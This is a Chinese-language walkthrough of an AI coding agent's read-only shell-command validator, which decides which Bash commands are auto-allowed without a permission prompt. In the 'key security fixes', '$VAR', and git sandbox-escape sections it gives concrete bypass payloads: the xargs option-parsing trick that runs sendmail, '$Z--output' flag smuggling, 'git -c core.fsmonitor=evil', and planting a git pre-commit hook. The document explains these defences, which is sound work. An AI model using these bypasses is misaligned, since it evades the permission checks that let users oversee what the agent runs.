## 第 100 站：`src/tools/BashTool/readOnlyValidation.ts`（1990 行）

### 这是什么文件

`readOnlyValidation.ts` 是 BashTool 的「只读命令」判定层——通过 flag 白名单和正则双重验证，判断一个命令是否纯读取、不写入、不执行、不联网。如果通过，命令可以被 auto-allow。

---

### 两个核心出口函数

#### `isCommandSafeViaFlagParsing()` — Flag 白名单验证
1. `tryParseShellCommand()` 解析 tokens
2. 有操作符（管道、重定向等）→ 不是简单命令 → false
3. 匹配 `COMMAND_ALLOWLIST` 中的多词命令（如 `git diff`）
4. 对每个 token 进行类型验证：
   - `$` 变量 → 直接 false（解析器差异：shell-quote 保留 `$VAR` 字面但 bash 展开）
   - 非安全 flag → false
   - 目标命令必须安全（xargs 的目标命令有限制列表）
5. 返回 true/false

#### `checkReadOnlyConstraints()` — 完整的只读约束检查
1. `bashCommandIsSafe_DEPRECATED()` 原始命令安全检查
2. Windows UNC 路径检查
3. cd + git 复合命令检查 → passthrough
4. 当前目录是 bare git 仓库 → passthrough
5. 命令创建 git 内部文件 + 运行 git → passthrough
6. Git 命令在沙箱中且不在原始 cwd → passthrough
7. splitCommand 后每个子命令检查 `isCommandReadOnly()`
8. 全部只读 → allow，否则 → passthrough

---

### `COMMAND_ALLOWLIST` 中的命令

| 命令 | 来源 | 说明 |
|---|---|---|
| `xargs` | 内置 | `-I {}`（不是 `-i`/`-e`，见安全注释）、`-n`、`-P`、`-E` 等 |
| `fd` / `fdfind` | 内置 | 除 `-x`/`--exec`、`-X`/`--exec-batch`、`-l` 外的所有 flag |
| `file` | 内置 | 纯文件类型检测 flag |
| `git diff` | GIT_READ_ONLY_COMMANDS | 排除 `-c`、`--exec-path`、`--config-env`、`--output` |
| `git stash list` | GIT_READ_ONLY_COMMANDS | 只读 stash 操作 |
| `git log` | GIT_READ_ONLY_COMMANDS | 只读日志操作 |
| 更多 git 子命令 | shared | 参见 shared/readOnlyCommandValidation.js |
| ripgrep 命令 | RIPGREP_READ_ONLY_COMMANDS | rg 的只读 flag |
| gh 命令 | GH_READ_ONLY_COMMANDS | GitHub CLI 的只读操作 |
| pyright 命令 | PYRIGHT_READ_ONLY_COMMANDS | 类型检查只读 |
| docker 命令 | DOCKER_READ_ONLY_COMMANDS | 只读 docker 操作 |

---

### 关键安全修复

#### 1. xargs `-i` 和 `-e` 被移除
GNU getopt 的 `i::` 和 `e::` 是**可选参数**——参数必须附着在 flag 上（`-it` 而非 `-i t`）：
- `xargs -it tail a@evil.com` → 验证器认为 `-it` 都无参数，tail 是目标命令且安全；但 GNU xargs 把 `-i` 的参数设为 `t`，tail 是目标命令... 实际上 `echo /usr/sbin/sendmail | xargs -it` 中 `-it` 的 `t` 是替换字符串，sendmail 通过网络发送。
- `xargs -e EOF echo foo` → 验证器认为 EOF 是 `-e` 的参数；但 GNU xargs 没有附着参数 → 无 EOF 字符串 → `EOF` 变成目标命令执行。

**修复**：只允许 `-I {}`（POSIX，强制参数）和 `-E`（POSIX 强制参数）。

#### 2. `$VAR` 前缀绕过
`git diff "$Z--output=/tmp/pwned"`——shell-quote 保留 `$Z` 字面文本作为 token，bash 在运行时展开为 `--output=/tmp/pwned`：
- `isCommandSafeViaFlagParsing`：token `$Z--output=/tmp/pwned` 不匹配任何 flag 模式 → 被当作位置参数。
- `validateFlags` 的 `startsWith('-')` 检查也失效，因为 token 以 `$` 开头。

**修复**：任何包含 `$` 的 token → 直接 false。

#### 3. fd 的 `-l` / `--list-details` 被排除
内部执行 `ls` 子进程——如果 PATH 被劫持，恶意 `ls` 在 PATH 上会被执行。

#### 4. Git 配置注入
`git diff -c core.fsmonitor=evil`——`-c` 允许设置任意 git config 值，包括可执行命令的选项（core.fsmonitor、diff.external、core.gitProxy）。`--exec-path` 允许覆盖 git 查找可执行文件的目录。`--config-env` 允许从环境变量设置 git config。

---

### `READONLY_COMMAND_REGEXES`（简写验证器）

对于不在 flag 白名单中的命令，提供正则回退：
```
^cat\s+  → 只读
^head\s+  → 只读
^tail\s+  → 只读
^grep\s+  → 只读（排除 -A 后可跟 shell 命令的模式）
...
```
正则验证器比 flag 白名单宽松，但仍有安全守卫。

---

### `containsUnquotedExpansion()`

检测可能导致安全绕过的未引用展开：
- 未引用的 glob 字符（`*`、`?`、`[`）
- 未引用的 `$` 变量（`$VAR`、`$_`、`$*`）

**`uniq --skip-chars=0$_` 攻击**：`$_` 是 bash 中上一个命令的最后一个参数。通过 IFS 词分割，`$_` 可以注入任意 flag 值。`uniq` 的 `\S+` flag 正则匹配 `--skip-chars=0$_` 整个 token 为非安全字符，但 bash 展开后实际的值取决于运行时 `$_` 的内容。

---

### Git 沙箱逃逸防御

`checkReadOnlyConstraints()` 中有多层 Git 相关检查：

| 检查 | 攻击向量 |
|---|---|
| cd + git 复合命令 | `cd evil && git status` 执行恶意 hook |
| bare git 仓库检测 | 删除 `.git/HEAD` 后创建恶意 hooks |
| git 内部路径写入 | `mkdir -p hooks && echo evil > hooks/pre-commit && git status` |
| sandboxes 中 cwd 变化 | 沙箱中改变 cwd 后 git 命令可能被利用 |

---

### 读完这一站后，你应该抓住的 5 个事实

1. 只读验证有两层：`isCommandSafeViaFlagParsing()` 是严格的 flag 白名单验证（`COMMAND_ALLOWLIST` 包含 xargs、fd、git diff 等的全部安全 flag），`READONLY_COMMAND_REGEXES` 是宽松的正则回退。Flag 白名单更严格但更精确——它知道每个 flag 接受什么类型的值（none/number/string/char/EOF）。

2. `$VAR` 检查是验证器的关键安全边界：shell-quote 把 `$VAR` 保留为字面文本 token 用于模式匹配，但 bash 在运行时展开它。如果不检查 `$`，攻击者可以 `$VAR--flag=value` 来绕过 flag 模式匹配——验证器看到的是以 `$` 开头的 token 而非以 `-` 开头的 flag。

3. xargs 的 `-i` 和 `-e` 被移除是因为 GNU getopt 的可选参数语义——`-it` 中 `-i` 的参数是 `t`（附着），而 `-i t` 中 `-i` 没有参数，`t` 是下一个位置参数（目标命令）。验证器和 xargs 对 token 边界的不同理解导致绕过。

4. Git 沙箱逃逸有 4 层防御：cd+git 复合命令、bare git 目录检测、git 内部路径写入检测（mkdir hooks + git status）、沙箱中 cwd 变化检测。每一层针对不同的攻击路径，单独都不足以防御全部路径。

5. `checkReadOnlyConstraints()` 的返回值是 allow/passthrough 而非 allow/ask/deny——它只决定一个命令是否可以被自动允许为「只读」。如果不通过，它返回 passthrough 让其他权限检查处理，而不是直接 ask 或 deny。
